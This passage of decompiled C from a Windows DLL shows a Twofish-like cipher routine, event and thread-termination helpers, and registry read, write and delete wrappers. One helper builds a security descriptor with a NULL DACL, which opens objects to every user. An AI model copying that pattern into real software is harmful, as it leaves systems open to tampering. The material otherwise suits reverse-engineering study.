        v36 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v35 + v55[20] + v36) ^ v62, 1);
        v63 = (v35 + v55[21] + 2 * v36) ^ __ROL4__(v63, 1);
        v37 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v38 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v37 + v55[19] + 2 * v38) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v37 + v55[18] + v38) ^ v64, 1);
        v39 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v40 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v39 + v55[16] + v40) ^ v62, 1);
        v63 = (v39 + v55[17] + 2 * v40) ^ __ROL4__(v63, 1);
        v41 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v42 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v41 + v55[15] + 2 * v42) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v41 + v55[14] + v42) ^ v64, 1);
        v43 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v44 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v62 = __ROR4__((v43 + v55[12] + v44) ^ v62, 1);
        v63 = (v43 + v55[13] + 2 * v44) ^ __ROL4__(v63, 1);
        v45 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v62 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v62) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v62) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v62) + 2344);
        v46 = *(_DWORD *)(a2 + 8 * HIBYTE(v63) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v63) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v63 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v63) + 2344);
        v65 = (v45 + v55[11] + 2 * v46) ^ __ROL4__(v65, 1);
        v64 = __ROR4__((v45 + v55[10] + v46) ^ v64, 1);
        v47 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v64 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v64) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v64) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v64) + 2344);
        v48 = *(_DWORD *)(a2 + 8 * HIBYTE(v65) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v65) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v65 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v65) + 2344);
        v49 = (v47 + v55[9] + 2 * v48) ^ __ROL4__(v63, 1);
        v50 = __ROR4__((v47 + v55[8] + v48) ^ v62, 1);
        *a5 = v64 ^ v55[4];
        a5[1] = v65 ^ v55[5];
        v51 = v50 ^ v55[6];
        v52 = v49 ^ v55[7];
        v7 = v56;
        v53 = v56 == 2;
        a5[2] = v51;
        a5[3] = v52;
        if ( v53 )
        {
          v57 = *a5;
          v58 = a5[1];
          v59 = v51;
          v60 = a5[3];
        }
        v11 = a3 + 4;
        v53 = v69-- == 1;
        a3 += 4;
        a5 += 4;
      }
      while ( !v53 );
      v6 = a1;
    }
    if ( v7 == 2 )
    {
      *((_DWORD *)v6 + 6) = v57;
      *((_DWORD *)v6 + 7) = v58;
      *((_DWORD *)v6 + 8) = v59;
      *((_DWORD *)v6 + 9) = v60;
    }
  }
  return a4;
}

//----- (1000A856) --------------------------------------------------------
int __cdecl sub_1000A856(unsigned __int8 *a1, int a2, int *a3, int a4, int *a5)
{
  unsigned __int8 *v6; // edi
  int v7; // ebx
  char v8; // dl
  unsigned __int8 v9; // dl
  _BYTE *v10; // eax
  char v11; // dl
  int *v12; // edx
  int v13; // ebx
  int v14; // ecx
  int v15; // edi
  int v16; // edx
  int v17; // edx
  int v18; // ecx
  int v19; // edx
  int v20; // ecx
  int v21; // edx
  int v22; // ecx
  int v23; // edx
  int v24; // ecx
  int v25; // edx
  int v26; // ecx
  int v27; // edx
  int v28; // ecx
  int v29; // edx
  int v30; // ecx
  int v31; // edx
  int v32; // ecx
  int v33; // edx
  int v34; // ecx
  int v35; // edx
  int v36; // ecx
  int v37; // edx
  int v38; // ecx
  int v39; // edx
  int v40; // ecx
  int v41; // edx
  int v42; // ecx
  int v43; // edx
  int v44; // ecx
  int v45; // edx
  int v46; // ecx
  int v47; // edx
  int v48; // ecx
  int v49; // ecx
  int *v50; // ebx
  int *v51; // edx
  int v52; // eax
  int v53; // eax
  int v54; // eax
  int v55; // eax
  bool v56; // zf
  int v58; // [esp+Ch] [ebp-C8h] BYREF
  int v59; // [esp+10h] [ebp-C4h]
  int v60; // [esp+14h] [ebp-C0h]
  int v61; // [esp+18h] [ebp-BCh]
  int v62; // [esp+1Ch] [ebp-B8h]
  int v63; // [esp+20h] [ebp-B4h]
  int v64; // [esp+24h] [ebp-B0h]
  int v65; // [esp+28h] [ebp-ACh]
  int v66; // [esp+2Ch] [ebp-A8h]
  int v67; // [esp+30h] [ebp-A4h]
  int v68; // [esp+34h] [ebp-A0h]
  int v69; // [esp+38h] [ebp-9Ch]
  int v70; // [esp+3Ch] [ebp-98h]
  int v71; // [esp+40h] [ebp-94h]
  int v72; // [esp+44h] [ebp-90h]
  int v73; // [esp+48h] [ebp-8Ch]
  int v74; // [esp+4Ch] [ebp-88h]
  int v75; // [esp+50h] [ebp-84h]
  int v76; // [esp+54h] [ebp-80h]
  int v77; // [esp+58h] [ebp-7Ch]
  int v78; // [esp+5Ch] [ebp-78h]
  int v79; // [esp+60h] [ebp-74h]
  int v80; // [esp+64h] [ebp-70h]
  int v81; // [esp+68h] [ebp-6Ch]
  int v82; // [esp+6Ch] [ebp-68h]
  int v83; // [esp+70h] [ebp-64h]
  int v84; // [esp+74h] [ebp-60h]
  int v85; // [esp+78h] [ebp-5Ch]
  int v86; // [esp+7Ch] [ebp-58h]
  int v87; // [esp+80h] [ebp-54h]
  int v88; // [esp+84h] [ebp-50h]
  int v89; // [esp+88h] [ebp-4Ch]
  int v90; // [esp+8Ch] [ebp-48h]
  int v91; // [esp+90h] [ebp-44h]
  int v92; // [esp+94h] [ebp-40h]
  int v93; // [esp+98h] [ebp-3Ch]
  int v94; // [esp+9Ch] [ebp-38h]
  int v95; // [esp+A0h] [ebp-34h]
  int v96; // [esp+A4h] [ebp-30h]
  int v97; // [esp+A8h] [ebp-2Ch]
  int v98; // [esp+ACh] [ebp-28h]
  int v99; // [esp+B0h] [ebp-24h]
  int v100; // [esp+B4h] [ebp-20h]
  int v101; // [esp+B8h] [ebp-1Ch]
  int v102; // [esp+BCh] [ebp-18h]
  int i; // [esp+C0h] [ebp-14h]
  int v104; // [esp+C4h] [ebp-10h] BYREF
  int v105; // [esp+C8h] [ebp-Ch]
  int v106; // [esp+CCh] [ebp-8h]
  int v107; // [esp+D0h] [ebp-4h]
  char v108; // [esp+DFh] [ebp+Bh]
  char v109; // [esp+E0h] [ebp+Ch]
  unsigned int v110; // [esp+E0h] [ebp+Ch]

  v6 = a1;
  v7 = *(_DWORD *)(a2 + 80);
  i = *a1;
  if ( (_BYTE)i == 3 )
  {
    *a1 = 1;
    for ( i = 0; i < a4; ++i )
    {
      sub_10009EA5(v6, a2, v6 + 1, 128, &v104);
      v109 = i & 7;
      v8 = *((_BYTE *)a3 + i / 8);
      v98 = (int)a5 + i / 8;
      v9 = (128 >> (i & 7)) & v8;
      *(_BYTE *)v98 = *(_BYTE *)v98 & ~(128 >> (i & 7)) | v9 ^ ((unsigned __int8)(v104 & 0x80) >> (i & 7));
      v10 = v6 + 16;
      v108 = v9 >> (7 - v109);
      do
      {
        v11 = *v10 >> 7;
        *v10 = v108 ^ (2 * *v10);
        --v10;
        v108 = v11;
      }
      while ( (int)&v10[-1 - (_DWORD)v6] >= 0 );
    }
    *v6 = 3;
  }
  else
  {
    if ( *(_BYTE *)a2 != 1 )
      sub_1000905D(a2, 1);
    memcpy(&v58, (const void *)(a2 + 132), 8 * v7 + 32);
    if ( i == 2 )
    {
      v99 = *((_DWORD *)a1 + 6);
      v100 = *((_DWORD *)a1 + 7);
      v101 = *((_DWORD *)a1 + 8);
      v102 = *((_DWORD *)a1 + 9);
    }
    else
    {
      v102 = 0;
      v101 = 0;
      v100 = 0;
      v99 = 0;
    }
    if ( a4 > 0 )
    {
      v12 = a3;
      v110 = (unsigned int)(a4 + 127) >> 7;
      do
      {
        v13 = v12[3] ^ v65;
        v14 = v12[1] ^ v63;
        v15 = v12[2] ^ v64;
        v106 = v62 ^ *v12;
        v105 = v13;
        v107 = v14;
        v104 = v15;
        v16 = *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v98 = (unsigned __int8)v14;
        v17 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ v16;
        v18 = *(_DWORD *)(a2 + 8 * HIBYTE(v14) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v14) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v14 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v14) + 2344);
        v104 = (v17 + v18 + v96) ^ __ROL4__(v15, 1);
        v105 = __ROR4__(v13 ^ (v17 + v97 + 2 * v18), 1);
        v19 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v20 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v19 + v20 + v94) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v19 + v95 + 2 * v20), 1);
        v21 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v22 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v21 + v22 + v92) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v21 + v93 + 2 * v22), 1);
        v23 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v24 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v23 + v24 + v90) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v23 + v91 + 2 * v24), 1);
        v25 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v26 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v25 + v26 + v88) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v25 + v89 + 2 * v26), 1);
        v27 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v28 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v27 + v28 + v86) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v27 + v87 + 2 * v28), 1);
        v29 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v30 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v29 + v30 + v84) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v29 + v85 + 2 * v30), 1);
        v31 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v32 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v31 + v32 + v82) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v31 + v83 + 2 * v32), 1);
        v33 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v34 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v33 + v34 + v80) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v33 + v81 + 2 * v34), 1);
        v35 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v36 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v35 + v36 + v78) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v35 + v79 + 2 * v36), 1);
        v37 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v38 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v37 + v38 + v76) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v37 + v77 + 2 * v38), 1);
        v39 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v40 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v39 + v40 + v74) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v39 + v75 + 2 * v40), 1);
        v41 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v42 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v41 + v42 + v72) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v41 + v73 + 2 * v42), 1);
        v43 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v44 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v43 + v44 + v70) ^ __ROL4__(v106, 1);
        v107 = __ROR4__(v107 ^ (v43 + v71 + 2 * v44), 1);
        v45 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v106 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v106) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v106) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v106) + 2344);
        v46 = *(_DWORD *)(a2 + 8 * HIBYTE(v107) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v107) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v107 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v107) + 2344);
        v104 = (v45 + v46 + v68) ^ __ROL4__(v104, 1);
        v105 = __ROR4__(v105 ^ (v45 + v69 + 2 * v46), 1);
        v47 = *(_DWORD *)(a2 + 8 * (unsigned __int8)v104 + 292) ^ *(_DWORD *)(a2 + 8 * BYTE2(v104) + 2340) ^ *(_DWORD *)(a2 + 8 * BYTE1(v104) + 296) ^ *(_DWORD *)(a2 + 8 * HIBYTE(v104) + 2344);
        v48 = *(_DWORD *)(a2 + 8 * HIBYTE(v105) + 292) ^ *(_DWORD *)(a2 + 8 * BYTE1(v105) + 2340) ^ *(_DWORD *)(a2 + 8 * (unsigned __int8)v105 + 296) ^ *(_DWORD *)(a2 + 8 * BYTE2(v105) + 2344);
        v106 = (v47 + v48 + v66) ^ __ROL4__(v106, 1);
        v6 = a1;
        v49 = __ROR4__(v107 ^ (v47 + v67 + 2 * v48), 1);
        if ( *a1 == 1 )
        {
          v50 = a5;
          v51 = a3;
          *a5 = v104 ^ v58;
          a5[1] = v105 ^ v59;
          a5[2] = v106 ^ v60;
          a5[3] = v49 ^ v61;
        }
        else
        {
          v51 = a3;
          v52 = v99 ^ v104 ^ v58;
          v99 = *a3;
          *a5 = v52;
          v53 = v100 ^ v105 ^ v59;
          v100 = a3[1];
          a5[1] = v53;
          v54 = v101 ^ v106 ^ v60;
          v101 = a3[2];
          v50 = a5;
          a5[2] = v54;
          v55 = v102 ^ v49 ^ v61;
          v102 = a3[3];
          a5[3] = v55;
        }
        v12 = v51 + 4;
        v56 = v110-- == 1;
        a3 = v12;
        a5 = v50 + 4;
      }
      while ( !v56 );
    }
    if ( i == 2 )
    {
      *((_DWORD *)v6 + 6) = v99;
      *((_DWORD *)v6 + 7) = v100;
      *((_DWORD *)v6 + 8) = v101;
      *((_DWORD *)v6 + 9) = v102;
    }
  }
  return a4;
}

//----- (1000B21F) --------------------------------------------------------
int sub_1000B21F()
{
  int result; // eax

  result = sub_10008918((int)&unk_10014F40);
  dword_100160D8 = result;
  return result;
}
// 100160D8: using guessed type int dword_100160D8;

//----- (1000B235) --------------------------------------------------------
int sub_1000B235()
{
  int result; // eax

  result = sub_10008918((int)&unk_10014F90);
  dword_100160DC = result;
  return result;
}
// 100160DC: using guessed type int dword_100160DC;

//----- (1000B246) --------------------------------------------------------
bool __cdecl sub_1000B246(PSECURITY_DESCRIPTOR pSecurityDescriptor)
{
  return InitializeSecurityDescriptor(pSecurityDescriptor, 1u)
      && SetSecurityDescriptorDacl(pSecurityDescriptor, 1, 0, 0);
}

//----- (1000B2B4) --------------------------------------------------------
char __cdecl sub_1000B2B4(_DWORD *a1, LPCSTR lpName)
{
  HANDLE v2; // eax
  int v4; // [esp+0h] [ebp-20h] BYREF
  char v5; // [esp+Ch] [ebp-14h]
  int *v6; // [esp+10h] [ebp-10h]
  int v7; // [esp+1Ch] [ebp-4h]

  v6 = &v4;
  v5 = 0;
  v7 = 0;
  *a1 = 0;
  v2 = OpenEventA(2u, 0, lpName);
  *a1 = v2;
  if ( v2 && SetEvent(v2) )
    v5 = 1;
  else
    LOBYTE(v7) = 1;
  v7 = -1;
  return v5;
}

//----- (1000B316) --------------------------------------------------------
char __cdecl sub_1000B316(HANDLE hHandle, LPCSTR lpName, DWORD dwMilliseconds, DWORD dwExitCode)
{
  HANDLE EventA; // eax
  int v6; // [esp+0h] [ebp-28h] BYREF
  char v7; // [esp+Ch] [ebp-1Ch]
  HANDLE hEvent[2]; // [esp+14h] [ebp-14h] BYREF
  int v10; // [esp+24h] [ebp-4h]

  hEvent[1] = &v6;
  hEvent[0] = 0;
  v7 = 0;
  v10 = 0;
  if ( hHandle && (EventA = CreateEventA(0, 1, 0, lpName), (hEvent[0] = EventA) != 0) )
  {
    SetEvent(EventA);
    if ( WaitForSingleObject(hHandle, dwMilliseconds) )
      TerminateThread(hHandle, dwExitCode);
    v7 = 1;
  }
  else
  {
    LOBYTE(v10) = 1;
  }
  v10 = -1;
  sub_1000B3DD(&hHandle);
  sub_1000B3C8(hEvent[0]);
  sub_1000B3DD(hEvent);
  return v7;
}

//----- (1000B3C8) --------------------------------------------------------
BOOL __cdecl sub_1000B3C8(HANDLE hEvent)
{
  return hEvent && ResetEvent(hEvent);
}

//----- (1000B3DD) --------------------------------------------------------
BOOL __cdecl sub_1000B3DD(HANDLE *a1)
{
  BOOL result; // eax

  if ( !*a1 )
    return 0;
  result = CloseHandle(*a1);
  if ( result )
    *a1 = 0;
  return result;
}

//----- (1000B3FD) --------------------------------------------------------
int __cdecl sub_1000B3FD(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, LPBYTE lpData, size_t Size, _DWORD *a6)
{
  _DWORD *v6; // edi
  int v8; // [esp+0h] [ebp-28h] BYREF
  HKEY phkResult; // [esp+Ch] [ebp-1Ch] BYREF
  int v10; // [esp+10h] [ebp-18h]
  LSTATUS v11; // [esp+14h] [ebp-14h]
  int *v12; // [esp+18h] [ebp-10h]
  int v13; // [esp+24h] [ebp-4h]

  v12 = &v8;
  phkResult = 0;
  v13 = 0;
  if ( !lpData )
    return 2;
  v6 = a6;
  if ( a6 )
    *a6 = 0;
  v11 = RegOpenKeyExA(hKey, lpSubKey, 0, 1u, &phkResult);
  if ( v11 )
    return 2;
  memset(lpData, 0, Size);
  v11 = RegQueryValueExA(phkResult, lpValueName, 0, 0, lpData, &Size);
  RegCloseKey(phkResult);
  phkResult = 0;
  if ( v11 )
  {
    v10 = (v11 != 2) + 1;
    memset(lpData, 0, Size);
  }
  else
  {
    v10 = 0;
    if ( v6 )
      *v6 = Size;
  }
  v13 = -1;
  return v10;
}

//----- (1000B4ED) --------------------------------------------------------
int __cdecl sub_1000B4ED(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName, BYTE *lpData, DWORD cbData, DWORD dwType)
{
  LSTATUS v7; // esi
  int v8; // [esp+0h] [ebp-28h] BYREF
  HKEY phkResult; // [esp+Ch] [ebp-1Ch] BYREF
  LSTATUS v10; // [esp+14h] [ebp-14h]
  int *v11; // [esp+18h] [ebp-10h]
  int v12; // [esp+24h] [ebp-4h]

  v11 = &v8;
  phkResult = 0;
  v12 = 0;
  if ( !lpData )
    return 2;
  v10 = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20006u, &phkResult);
  if ( v10 )
    return 2;
  v7 = RegSetValueExA(phkResult, lpValueName, 0, dwType, lpData, cbData);
  v10 = v7;
  RegCloseKey(phkResult);
  return v7 != 0 ? 2 : 0;
}

//----- (1000B5AA) --------------------------------------------------------
bool __cdecl sub_1000B5AA(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpValueName)
{
  DWORD LastError; // eax
  HKEY phkResult; // [esp+Ch] [ebp-24h] BYREF
  LSTATUS v6; // [esp+14h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  phkResult = 0;
  ms_exc.registration.TryLevel = 0;
  v6 = RegOpenKeyExA(hKey, lpSubKey, 0, 2u, &phkResult);
  if ( v6 )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  v6 = RegDeleteValueA(phkResult, lpValueName);
  RegCloseKey(phkResult);
  return v6 == 0;
}

//----- (1000B688) --------------------------------------------------------
bool sub_1000B688()
{
  return (sub_1000D3AF() & 0x3C0) != 0;
}

//----- (1000B695) --------------------------------------------------------
char __cdecl sub_1000B695(LPCSTR lpString)
{
  int v2; // eax
  unsigned int v3; // ecx

  if ( !lpString )
    return 0;
  v2 = lstrlenA(lpString);
  if ( *lpString == 34 && lpString[v2 - 1] == 34 )
  {
    v3 = 0;
    do
    {
      lpString[v3] = lpString[v3 + 1];
      ++v3;
    }
    while ( v3 <= v2 - 3 );
    lpString[v2 - 2] = 0;
  }
  return 1;
}

//----- (1000B6D3) --------------------------------------------------------
int __cdecl sub_1000B6D3(LPCSTR lpName, HANDLE *a2)
{
  HANDLE EventA; // eax

  EventA = CreateEventA(0, 0, 0, lpName);
  *a2 = EventA;
  if ( EventA )
  {
    if ( GetLastError() != 183 )
      return 1;
    CloseHandle(*a2);
    *a2 = 0;
  }
  else
  {
    GetLastError();
  }
  return 0;
}

//----- (1000B75A) --------------------------------------------------------
char __cdecl sub_1000B75A(LPCSTR lpName)
{
  int v2; // [esp+0h] [ebp-28h] BYREF
  DWORD LastError; // [esp+Ch] [ebp-1Ch]
  HANDLE v4; // [esp+10h] [ebp-18h] BYREF
